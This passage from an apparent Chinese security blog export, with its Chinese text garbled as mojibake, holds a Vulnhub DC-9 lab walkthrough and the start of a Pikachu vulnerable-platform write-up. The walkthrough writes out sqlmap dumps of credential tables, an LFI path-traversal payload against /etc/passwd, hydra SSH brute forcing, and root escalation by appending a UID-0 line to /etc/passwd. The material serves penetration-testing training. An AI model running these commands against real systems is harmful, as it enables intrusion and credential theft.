align=\"center\"><jsp:getProperty name=\"calc\" property=\"result\"/></td>\n    \t</tr>\n    </table>\n  </body>\n</html>\n```\n\n\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["JSP"],"categories":["JavaWeb"]},{"title":"Vulnhubé¶æœºï¼šDC-9","url":"/posts/55886.html","content":"\n## DC-9ç®€ä»‹\n\n**é¶æœºä¸‹è½½åœ°å€ï¼š**https://download.vulnhub.com/dc/DC-9.zip\n\n**é¶æœºæè¿°ï¼š**DC-9 æ˜¯å¦ä¸€ä¸ªä¸“é—¨æ„å»ºçš„æ˜“å—æ”»å‡»çš„å®éªŒå®¤ï¼Œæ—¨åœ¨è·å¾—æ¸—é€æµ‹è¯•é¢†åŸŸçš„ç»éªŒã€‚è¿™ä¸€æŒ‘æˆ˜çš„æœ€ç»ˆç›®æ ‡æ˜¯è·å¾—rootï¼Œå¹¶é˜…è¯»å”¯ä¸€çš„flagã€‚\n\n**æ¶‰åŠæ¼æ´ï¼š**SQLæ³¨å…¥ã€LFI\n\n**æ”»å‡»æœºï¼š**Kali/192.168.0.104\n\n## ä¸€ã€ä¿¡æ¯æ”¶é›†\n\n### 1.æ¢æµ‹ç›®æ ‡\n\n```bash\n$ sudo arp-scan -l\næˆ–è€…\n$ sudo netdiscover -i eth0\n```\n\n![](https://i.loli.net/2020/05/24/Xhv9srF4p3K6QTt.png)\n\n### 2.æŸ¥çœ‹ç›®æ ‡å¼€æ”¾ç«¯å£\n\n```bash\n$ sudo nmap -sV -p 0-6553 192.168.0.105\n```\n\n![](https://i.loli.net/2020/05/24/iGFDpYN6uMvnHq1.png)\n\nç›®æ ‡é¶æœºå¼€æ”¾äº†80ç«¯å£,22ç«¯å£æ˜¾ç¤ºè¢«è¿‡æ»¤æ‰äº†\n\n#### 3.æŸ¥çœ‹ç½‘é¡µç›¸å…³ä¿¡æ¯\n\nä½¿ç”¨æµè§ˆå™¨æ’ä»¶`Wappalyzer`ï¼Œè¿™ä¸ªæ’ä»¶å¯ä»¥æ£€æµ‹ç½‘ç«™çš„CMSï¼Œæ¡†æ¶ï¼ŒæœåŠ¡å™¨ç­‰ä¿¡æ¯ï¼Œ\n\n![](https://i.loli.net/2020/05/24/qOPklaIWVLFtiTC.png)\n\nä½†æ˜¯æ²¡æœ‰æ£€æµ‹åˆ°CMSä¿¡æ¯\n\n## äºŒã€æ¼æ´æŸ¥æ‰¾ä¸åˆ©ç”¨\n\n### 1.SQLæ³¨å…¥\n\nåœ¨é¡µé¢å‘ç°ä¸€ä¸ªsearchæ¡†ï¼Œå¯ä»¥æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ï¼Œä¸æ•°æ®åº“æœ‰äº¤äº’ï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨SQLæ³¨å…¥ï¼Œéšä¾¿è¾“å…¥æ•°æ®æŸ¥è¯¢ï¼ŒURLæ¡†æ²¡æœ‰æ”¹å˜ï¼Œè¯´æ˜æ˜¯POSTæ–¹å¼æäº¤ï¼ŒBurpæŠ“åŒ…æ£€æµ‹æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥çš„å¯èƒ½\n\n![](https://i.loli.net/2020/05/24/7JsYehVuf9Wqj6g.png)\n\nå¯ä»¥çœ‹å‡ºç¡®å®å­˜åœ¨POSTå‹SQLæ³¨å…¥ï¼Œç½‘ç«™åº”è¯¥å¯¹æ³¨å…¥åšäº†ä¸€äº›åº”å¯¹æªæ–½ã€‚è¿‡æ»¤å•Šï¼Œå±è”½æŠ¥é”™å•Š\n\nå±…ç„¶å­˜åœ¨æ³¨å…¥ï¼Œè¯ä¸å¤šè¯´ï¼Œç›´æ¥ä¸ŠSQLmapè·‘\n\n```bash\nsqlmap -u \"http://192.168.0.105/results.php\" --data \"search=1\" --dbs\n\navailable databases [3]:\n[*] information_schema\n[*] Staff\n[*] users\n\n--data:æŒ‡å®šçš„æ•°æ®ä¼šè¢«ä½œä¸ºPOSTæ•°æ®æäº¤\n```\n\nå‘ç°Staffå’Œusersæ•°æ®åº“ï¼Œå…ˆçœ‹çœ‹usersåº“ä¸­æœ‰ä»€ä¹ˆ\n\n**usersæ•°æ®åº“**\n\n```bash\nsqlmap -u \"http://192.168.0.105/results.php\" --data \"search=1\" -D users --tables\n\nDatabase: users\n[1 table]\n+-------------+\n| UserDetails |\n+-------------+\n```\n\n```bash\nsqlmap -u \"http://192.168.0.105/results.php\" --data \"search=1\" -D users -T UserDetails --dump\n\nDatabase: users\nTable: UserDetails\n[17 entries]\n+----+------------+---------------+---------------------+-----------+-----------+\n| id | lastname   | password      | reg_date            | username  | firstname |\n+----+------------+---------------+---------------------+-----------+-----------+\n| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |\n| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |\n| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |\n| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |\n| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |\n| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |\n| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |\n| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |\n| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |\n| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |\n| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |\n| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |\n| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |\n| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |\n| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |\n| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |\n| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |\n+----+------------+---------------+---------------------+-----------+-----------+\n```\n\nè¿™é‡Œæ˜¯é‚£äº›å‘˜å·¥è¿™è´¦å·å’Œå¯†ç ï¼Œåé¢å¯èƒ½ä¼šç”¨åˆ°ï¼Œå…ˆæ”¾ç€ï¼Œç„¶åæˆ‘ä»¬å†çœ‹çœ‹Staffåº“é‡Œé¢æœ‰å•¥\n\n**Staffæ•°æ®åº“**\n\n```bash\nsqlmap -u \"http://192.168.0.105/results.php\" --data \"search=1\" -D Staff --tables\n\nDatabase: Staff\n[2 tables]\n+--------------+\n| StaffDetails |\n| Users        |\n+--------------+\n```\n\n```bash\nsqlmap -u \"http://192.168.0.105/results.php\" --data \"search=1\" -D Staff -T StaffDetails --dump\n```\n\n![](https://i.loli.net/2020/05/24/1ATcKngtzZLsf2Y.png)\n\n```bash\nsqlmap -u \"http://192.168.0.105/results.php\" --data \"search=1\" -D Staff -T Users --dump\n\n#dumpå®Œå¯†ç çš„æ—¶å€™ä¼šæç¤ºä½ æ˜¯å¦è§£å¯†md5,ä½ é€‰æ‹©SQLmapè‡ªå¸¦çš„å­—å…¸å°±å¯ä»¥è·‘å‡ºæ˜æ–‡å¯†ç \n```\n\n![](https://i.loli.net/2020/05/24/AgQZfhdyX7qrKjk.png)\n\nå¾—åˆ°ç”¨æˆ·åå’Œå¯†ç ï¼š**admin/transorbital1**ç„¶åä½¿ç”¨è¿™ä¸ªç”¨æˆ·å»ç«™ç‚¹ç™»å½•\n\n![](https://i.loli.net/2020/05/24/VPpf2usMIc9jd6F.png)\n\n### 2.æœ¬åœ°æ–‡ä»¶åŒ…å«LFI\n\nç™»å½•åå¤šäº†`Add Recordå’ŒManage`é¡µé¢ï¼Œåœ¨`Manage`çš„ä¸‹é¢å‘ç°äº†ä¸€å¥è¯`File does not exits` ï¼ŒçŒœæµ‹å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´,çŒœæµ‹æ–‡ä»¶å‚æ•°æ˜¯**file**\n\n```\n?file=../../../../etc/passwd\n```\n\n![](https://i.loli.net/2020/05/24/tqfT64rpaSu1YI8.png)\n\næœç„¶å­˜åœ¨LFIæ¼æ´,æ¥ä¸‹æ¥æ˜¯`fuzz`ä¸€ä¸‹ç³»ç»Ÿæ–‡ä»¶\n\n![](../images/Vulnhub%E9%9D%B6%E6%9C%BA%EF%BC%9ADC-9/image-20200524131121933.png)\n\nå‘ç°äº†`/etc/knockd.conf`ï¼Œè¿™å°±å’Œä¹‹å‰`nmap`æ‰«æé¶æœºè¿è¡Œäº†SSHæœåŠ¡ï¼Œä½†æ˜¯çŠ¶æ€æ˜¯`filtered`å¯¹åº”èµ·æ¥äº†ï¼Œå› ä¸º`knockd`å¯ä»¥å¯¹SSHè¿›è¡Œé˜²æŠ¤\n\n### 3.ç«¯å£æ•²é—¨\n\n> `knockd`å­—é¢æ„æ€æ˜¯æ•²ï¼Œåªæ˜¯è¿™é‡Œæ•²çš„æ˜¯`ç«¯å£`ï¼Œè€Œä¸”éœ€è¦æŒ‰ç…§é¡ºåºâ€˜æ•²â€™ç«¯å£ã€‚å¦‚æœæ•²å‡»è§„åˆ™åŒ¹é…ï¼Œåˆ™å¯ä»¥è®©é˜²ç«å¢™å®æ—¶æ›´æ”¹ç­–ç•¥ã€‚ä»è€Œè¾¾åˆ°å¼€å…³é˜²ç«å¢™çš„ç›®çš„ã€‚\n\næ›´å¤šè¯¦ç»†è¯·çœ‹ï¼š\n\n- [Port-knocking ç®€å•æ•™ç¨‹](https://www.cnblogs.com/xiaoxiaoleo/p/8523322.html)\n\n- [ç«¯å£æ•²é—¨æœåŠ¡](https://zhuanlan.zhihu.com/p/59488488)\n\n- [ä¿æŠ¤ SSH çš„ä¸‰æŠŠé”](https://www.ibm.com/developerworks/cn/aix/library/au-sshlocks/index.html)\n\nçœ‹ä¸€ä¸‹`/etc/knockd.conf`æ–‡ä»¶ä¸­çš„è‡ªå®šä¹‰ç«¯å£\n\n![](https://i.loli.net/2020/05/24/64fRKVQMw1lELkX.png)\n\næœ‰3ä¸ªè‡ªå®šä¹‰ç«¯å£`7469ï¼Œ8475ï¼Œ9842`,æ ¹æ®`Port-knocking`çš„è§„åˆ™ä¾æ¬¡è®¿é—®è¿™ä¸‰ä¸ªç«¯å£å°±å¯ä»¥æ‰“å¼€SSHæœåŠ¡äº†\n\n```bash\nsudo nmap -p 7469 192.168.0.105\nsudo nmap -p 8475 192.168.0.105\nsudo nmap -p 9842 192.168.0.105\n\næˆ–è€…å®‰è£…knockd\nknock 192.168.0.105 7469 8475 9842\n```\n\n![](https://i.loli.net/2020/05/24/JWvxTckDZNijXfO.png)\n\nç°åœ¨æˆ‘ä»¬çœ‹ä¸€å“ˆsshæœåŠ¡è¢«æ•²å¼€æ²¡æœ‰\n\n```\nsudo nmap -p 22 192.168.0.105\n```\n\n![](https://i.loli.net/2020/05/24/jU1YD8TIMEHVX2m.png)\n\nä¸å‡ºæ‰€æ–™SSHæœåŠ¡è¢«æˆåŠŸæ•²å¼€\n\n### 4.hydraçˆ†ç ´SSHè´¦æˆ·\n\nå°†å‰é¢æ‰€çˆ†å‡ºæ¥çš„é‚£äº›å‘˜å·¥çš„è´¦å·å’Œå¯†ç ç¼–å†™æˆä¸¤ä¸ªå­—å…¸ï¼Œè¿›è¡Œsshçˆ†ç ´\n\n| username.txt                                           | password.txt                                           |\n| ------------------------------------------------------ | ------------------------------------------------------ |\n| ![](https://i.loli.net/2020/05/24/Pekn7KWZwCj68lB.png) | ![](https://i.loli.net/2020/05/24/532jwQDIftZloWb.png) |\n\n```bash\nhydra -L username.txt -P password.txt ssh://192.168.0.105 \n```\n\n![](https://i.loli.net/2020/05/24/jZfit8YRFUrehVl.png)\n\nçˆ†ç ´å‡ºæ¥æœ‰3ä¸ªç”¨æˆ·å¯ç”¨ï¼Œ`chandlerb\\UrAG0D!`ã€`joeyt\\Passw0rd`ã€`janitor\\Ilovepeepee`\n\nä¾æ¬¡ç™»å½•3ä¸ªç”¨æˆ·ï¼Œæœ€ç»ˆåœ¨ç”¨æˆ·`janitor`çš„ç›®å½•ä¸‹æ‰¾åˆ°äº†éšè—æ–‡ä»¶\n\n```bash\nssh chandlerb@192.168.0.105 \nUrAG0D!\n\nssh joeyt@192.168.0.105 \nPassw0rd\n\nssh janitor@192.168.0.105 \nIlovepeepee\n```\n\n![](https://i.loli.net/2020/05/24/AHniNy6gY4cLIE3.png)\n\n`.secrets-for-putin`éšè—æ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªå¯è¯»æ–‡ä»¶ï¼Œæ‰“å¼€åè¿™å¥½åƒæ˜¯å­˜æ”¾çš„ç”¨æˆ·å¯†ç ï¼Œç„¶åæŠŠè¿™äº›å¯†ç å†åŠ è¿›åˆšåˆšæˆ‘ä»¬ç¼–å†™çš„`password.txt`å­—å…¸ä¸­é‡æ–°å†çˆ†ç ´ä¸€æ¬¡çœ‹çœ‹\n\n![](https://i.loli.net/2020/05/24/VY2IExTHm7dcl51.png)\n\nçˆ†ç ´å‡ºäº†ä¸€ä¸ªæ–°çš„ç”¨æˆ·å·ï¼š`fredf\\B4-Tru3-001`\n\n## ä¸‰ã€æå‡æƒé™\n\nä½¿ç”¨`fredf`ç”¨æˆ·ç™»å½•é¶æœº\n\n```bash\nssh fredf@192.168.0.105\nB4-Tru3-001\n```\n\nåˆ—å‡ºsudoæƒé™çš„å‘½ä»¤ï¼Œè¿™é‡Œå‘ç°fredç”¨æˆ·åœ¨`NOPASSWD`çš„æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨rootæƒé™è¿è¡Œè¿™ä¸ªtestæ–‡ä»¶\n\n```bash\nsudo -l\n```\n\n![](https://i.loli.net/2020/05/24/QTN2BKmgElhRJa1.png)\n\nå°è¯•è¿è¡Œï¼Œå‘ç°å®ƒæ˜¯ä¸€ä¸ªpythonæ–‡ä»¶\n\n![](https://i.loli.net/2020/05/24/1rZh73gSJDRWf4X.png)\n\nä½¿ç”¨findæŸ¥æ‰¾test.pyæ–‡ä»¶\n\n```bash\nfind / -name test.py 2>/dev/null\n\n2>/dev/null ä»£è¡¨å¿½ç•¥æ‰é”™è¯¯æç¤ºä¿¡æ¯ã€‚\n```\n\n![](https://i.loli.net/2020/05/24/RHetfyhYCZM8FVo.png)\n\næŸ¥çœ‹test.py\n\n![image-20200524145858769](https://i.loli.net/2020/05/24/jyYTd4DziHJGgaW.png)\n\npyæ–‡ä»¶çš„å«ä¹‰ä¸ºï¼š`è¯»å–å‚æ•°1çš„å†…å®¹ï¼Œç„¶åå°†å‚æ•°1çš„å†…å®¹å†™å…¥åˆ°å‚æ•°2çš„å†…å®¹ä¸­ã€‚`\n\né‚£æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªrootæƒé™ç”¨æˆ·ï¼Œå°†è¯¥ç”¨æˆ·ä¿¡æ¯å†™å…¥æ–‡ä»¶å†…ï¼Œå°†æ”¹æ–‡ä»¶ä½œä¸ºå‚æ•°1ï¼Œ`/etc/passwd`ä½œä¸ºå‚æ•°2ï¼Œè¿™æ ·å°±åˆ›å»ºäº†ä¸€ä¸ªrootæƒé™ç”¨æˆ·ï¼Œå°±èƒ½å®ç°ææƒäº†\n\n**æ„é€ å‚æ•°1**\n\n```bash\nopenssl passwd -1 -salt admin 123456\n\n-1 çš„æ„æ€æ˜¯ä½¿ç”¨md5åŠ å¯†ç®—æ³•\n-salt è‡ªåŠ¨æ’å…¥ä¸€ä¸ªéšæœºæ•°ä½œä¸ºæ–‡ä»¶å†…å®¹åŠ å¯†\nadmin 123456 ç”¨æˆ·åå’Œå¯†ç \n```\n\n![](https://i.loli.net/2020/05/24/T8Uc6xaQY1lnNIk.png)\n\næ ¹æ®`/etc/passwd`çš„æ ¼å¼ï¼Œä¿®æ”¹ä¸€ä¸‹ï¼Œç„¶åå­˜å…¥ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œè¿™ä¸ªæ–‡ä»¶å°±æ˜¯`å‚æ•°1`\n\n```bash\necho 'admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash' >> /tmp/passwd\n    # ç”¨æˆ·å:å¯†ç :uid:gid:å®¶ç›®å½•:ç™»é™†åä½¿ç”¨çš„shell\n    \nsudo ./test /tmp/passwd /etc/passwd    \n```\n\n![](https://i.loli.net/2020/05/24/XveFQ2ZUgJj61lk.png)\n\n```bash\nsu admin\ncd /root\nls\ncat theflag.txt\n```\n\n![](https://i.loli.net/2020/05/24/QL2PaDpKjFMXrcH.png)\n\n![](https://i.loli.net/2020/05/24/L9NzyOlfR5ZpUHq.png)\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä¸€æ¯å†°å¯ä¹å§ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["é¶åœº","æ¸—é€æµ‹è¯•"],"categories":["Web"]},{"title":"Pikachuæ¼æ´å¹³å°é€šå…³è®°å½•","url":"/posts/30313.html","content":"å¼€å§‹å¤ä¹ æœ€åŸºç¡€çš„Webæ¼æ´ï¼ŒæŸ¥æ¼è¡¥ç¼ºï¼Œæ‰“å¥½åŸºç¡€ï¼Œæˆ‘ä¹Ÿå°½é‡æŠŠæ–‡ç« å†™å¾—è¯¦ç»†ä¸€äº›ï¼Œå¸Œæœ›å¯¹åˆšå…¥é—¨çš„å°ç™½èƒ½æœ‰ä¸€äº›å¸®åŠ©ã€‚\n\n## Pikachu\n\n**ç®€ä»‹**\n\n> Pikachuæ˜¯ä¸€ä¸ªå¸¦æœ‰æ¼æ´çš„Webåº”ç”¨ç³»ç»Ÿï¼Œåœ¨è¿™é‡ŒåŒ…å«äº†å¸¸è§çš„webå®‰å…¨æ¼æ´ã€‚ å¦‚æœä½ æ˜¯ä¸€ä¸ªWebæ¸—é€æµ‹è¯•å­¦ä¹ äººå‘˜ä¸”æ­£å‘æ„æ²¡æœ‰åˆé€‚çš„é¶åœºè¿›è¡Œç»ƒä¹ ï¼Œé‚£ä¹ˆPikachuå¯èƒ½æ­£åˆä½ æ„ã€‚\n\n**å®‰è£…**\n\né¡¹ç›®åœ°å€ï¼šhttps://github.com/zhuifengshaonianhanlu/pikachu\n\n1.å°†ä¸‹å¥½çš„é¡¹ç›®æ”¾ç½®phpStudyçš„`WWW`ç›®å½•ä¸‹\n\n2.ç„¶åä¿®æ”¹é…ç½®æ–‡ä»¶`/pikachu-master/inc/config.inc.php`ï¼Œä¿®æ”¹æˆè‡ªå·±çš„mysqlç”¨æˆ·åå’Œå¯†ç \n\n3.æµè§ˆå™¨è®¿é—® http://127.0.0.1/pikachu-master/ è¿›å…¥ä¸»é¡µé¢\n\n4.ç‚¹å‡»é¦–é¡µçº¢è‰²å­—ä½“è¿›è¡Œåˆå§‹åŒ–å®‰è£…\n\n**ä¹±ç è§£å†³**\n\nå¦‚æœé¶åœºå‡ºç°äº†ä¹±ç ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ­¥éª¤\n\n1.æŒ‰\"win + R\" ï¼Œå¹¶è¾“å…¥ regedit è¿›å…¥æ³¨å†Œè¡¨\n\n2.æ‰¾åˆ° `HKEY_CURRENT_USER\\Console\\%SystemRoot%_system32_cmd.exe`ï¼Œå¦‚æœè¯¥é¡¹ä¸‹å·²å­˜åœ¨ `CodePage` é¡¹ï¼Œåˆ™æŠŠå€¼æ”¹ä¸ºåè¿›åˆ¶ \"`65001`\"ï¼Œç‚¹å‡»ç¡®å®šå³å¯ï¼›å¦‚æœä¸å­˜åœ¨ï¼Œåœ¨è¯¥é¡¹ä¸‹æ–°å»ºä¸€ä¸ª DWORDï¼ˆ32ä½å€¼ï¼‰ï¼Œå‘½åä¸º \"CodePage\"ï¼Œå€¼è®¾ä¸º \"65001\"ã€‚ç„¶åå…³é—­æ³¨å†Œè¡¨ç®¡ç†å™¨ã€‚\n\n## Burte Force\n\n### åŸºç¡€çŸ¥è¯†å‡†å¤‡\n\n> æš´åŠ›ç ´è§£(Burte Force)æ˜¯ä¸€æ”»å‡»å…·æ‰‹æ®µï¼Œåœ¨webæ”»å‡»ä¸­ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨è¿™ç§æ‰‹æ®µå¯¹åº”ç”¨ç³»ç»Ÿçš„è®¤è¯ä¿¡æ¯è¿›è¡Œè·å–ã€‚ å…¶è¿‡ç¨‹å°±æ˜¯ä½¿ç”¨å¤§é‡çš„è®¤è¯ä¿¡æ¯åœ¨è®¤è¯æ¥å£è¿›è¡Œå°è¯•ç™»å½•ï¼Œç›´åˆ°å¾—åˆ°æ­£ç¡®çš„ç»“æœã€‚ ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæš´åŠ›ç ´è§£ä¸€èˆ¬ä¼šä½¿ç”¨å¸¦æœ‰å­—å…¸çš„å·¥å…·æ¥è¿›è¡Œè‡ªåŠ¨åŒ–æ“ä½œã€‚\n\n**Burpå„ç§æ”»å‡»æ¨¡å¼çš„åŒºåˆ«**\n\n1. **Sinperï¼š**ä¸€ä¸ªå˜é‡è®¾ç½®ä¸€ä¸ªpayloadè¿›è¡Œæ”»å‡»\n2. **Battering ramï¼š**å¯ä»¥è®¾ç½®ä¸¤ä¸ªå˜é‡ï¼ŒæŠŠpayloadåŒæ—¶ç»™ä¸¤ä¸ªå˜é‡\n3. **Pitchforkï¼š**ä¸¤ä¸ªå˜é‡åˆ†åˆ«è®¾ç½®payloadï¼Œç„¶åæŒ‰é¡ºåºä¸€ä¸€å¯¹åº”è¿›è¡Œç ´è§£\n4. **Cluster bombï¼š**ä¸¤ä¸ªå˜é‡åˆ†åˆ«è®¾ç½®payloadï¼Œç„¶åäº¤å‰åˆ—æ‰€æœ‰æƒ…å†µè¿›è¡Œç ´è§£ï¼ˆå¸¸ç”¨ï¼‰ \n\n### åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£\n\nè¿™ä¸ªè¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼ŒæŠ“åŒ…å‘é€åˆ°intruderæ¨¡å—ï¼Œé…ç½®å‚æ•°å¼€å§‹æ”»å‡»å°±å¯ä»¥äº†ï¼Œæˆ‘å°±æ‡’å¾—å†™äº†ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« \n\nå‚è€ƒï¼š[Pikachuæš´åŠ›ç ´è§£â€”â€”åŸºäºè¡¨å•](https://www.cnblogs.com/ApricityJ/p/12628753.html)\n\n### éªŒè¯ç ç»•è¿‡(on server)\n\n> éªŒè¯ç å¯ä»¥ç”¨æ¥é˜²æ­¢æ¶æ„æ³¨å†Œã€é˜²æ­¢æš´åŠ›ç ´è§£ã€‚\n\n**æœåŠ¡ç«¯éªŒè¯ç å¸¸è§é—®é¢˜ï¼š**\n\n- 1.éªŒè¯ç è®¾è®¡çš„å¤ªè¿‡ç®€å•å’Œæœ‰è§„å¾‹ï¼Œå®¹æ˜“è¢«çŒœè§£\n- 2.éªŒè¯ç æ ¡éªŒä¸ä¸¥æ ¼ï¼Œé€»è¾‘å‡ºç°é—®é¢˜\n- 3.éªŒè¯ç åœ¨åå°ä¸è¿‡æœŸï¼Œå¯¼è‡´é•¿æœŸå¯ä»¥ä½¿ç”¨\n\næ£€æŸ¥éªŒè¯ç å…ƒç´ ï¼Œå‘ç°éªŒè¯æœºåˆ¶æ¥è‡ªåç«¯\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/EuZBhv5RHaNXzJw.png)\n\né‚£ä¹ˆæˆ‘ä»¬æ ¹æ®è¿™3ä¸ªå¸¸è§é—®é¢˜æˆ‘ä»¬æ¥ä¸€ä¸€éªŒè¯æ˜¯å¦Pikachué¶åœºæ»¡è¶³ä¸Šé¢ä¸‰æ¡ä¸­çš„æƒ…å†µï¼Œé‚£æˆ‘ä»¬æ‰“å¼€é¶åœºé¡µé¢å§ï¼\n\nä¸€ã€è§‚å¯ŸéªŒè¯ç ï¼ŒéªŒè¯ç æ˜¯æ²¡æœ‰è§„å¾‹çš„ï¼Œå¹¶ä¸”ä¹Ÿä¸ç®€å•ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¡ä¸æ»¡è¶³\n\näºŒã€å½“éªŒè¯ç è¾“å…¥æ­£ç¡®ã€é”™è¯¯å’Œè¾“å…¥ä¸ºç©ºä¼šæ˜¯ä»¥ä¸‹3ç§æƒ…å†µï¼š\n\n| éªŒè¯ç æ­£ç¡®                                                   | éªŒè¯ç é”™è¯¯                                                   | éªŒè¯ç ä¸ºç©º                                                   |\n| ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/vjVWKpezmsNaUG4.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/6pZYRdMaGClBQ9E.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/zQo9KaXrB6tW7fG.png) |\n\nå¯ä»¥çœ‹åˆ°æœåŠ¡ç«¯å¯¹éªŒè¯ç çš„æœ‰æ•ˆæ€§åšè¿‡æ ¡éªŒ,ä¸€åˆ‡é€»è¾‘æ­£å¸¸ï¼Œæ‰€ä»¥ç¬¬äºŒæ¡ä¹Ÿä¸æ»¡è¶³\n\nä¸‰ã€æˆ‘ä»¬éšä¾¿è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œè¾“å…¥æ­£ç¡®éªŒè¯ç è¿›è¡ŒæŠ“åŒ…ï¼Œå‘é€åˆ°repeateræ¨¡å—\n\n| ç”¨æˆ·åå¯†ç ä¸åŒï¼ŒéªŒè¯ç ç›¸åŒ                                   | ç”¨æˆ·åå¯†ç ä¸åŒï¼ŒéªŒè¯ç ç›¸åŒ                                   |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/Sb3FWYldJEZjmqO.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/6nFUis8RyW5LwJE.png) |\n\næŒ‰ç†è¯´è¾“å…¥ä¸åŒçš„ç”¨æˆ·ï¼Œåº”è¯¥æŠ¥éªŒè¯é”™è¯¯çš„æç¤ºï¼Œä½†æ˜¯è¿™é‡Œå´æ²¡æœ‰ï¼Œè¯´æ˜åœ¨è¾“å…¥ç¬¬äºŒä¸ªç”¨æˆ·æ—¶éªŒè¯ç è¿˜æ²¡æœ‰è¿‡æœŸï¼Œé‚£ä¹ˆç¬¬ä¸‰ç§æƒ…å†µå°±æ»¡è¶³äº†\n\n**æ¼æ´åˆ†æ:**\n\n- å½“åˆ·æ–°é¡µé¢,å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘å‡ºè¯·æ±‚,ç”Ÿå‡ºæ–°çš„éªŒè¯ç ï¼›\n\n- åŒæ—¶åå°ä¼šåœ¨`session`ä¸­å°†è¿™ä¸ªéªŒè¯ç å­˜ä¸‹æ¥ã€ç›®çš„æ˜¯ä¸ºäº†å¯¹ç”¨æˆ·è¾“å…¥çš„éªŒè¯ç è¿›è¡ŒéªŒè¯)ã€‘ï¼›\n\n- æ‰€ä»¥å½“è¾“å…¥é”™è¯¯æˆ–ç©ºçš„éªŒè¯ç éƒ½ä¼šæç¤ºé”™è¯¯ä¿¡æ¯,åªæœ‰æ­£ç¡®çš„éªŒè¯ç æ‰å¯ä»¥è¢«æœåŠ¡å™¨æ¥å—ï¼›\n\n- ä½†æ˜¯å¦‚æœè¿™ä¸ªéªŒè¯ç 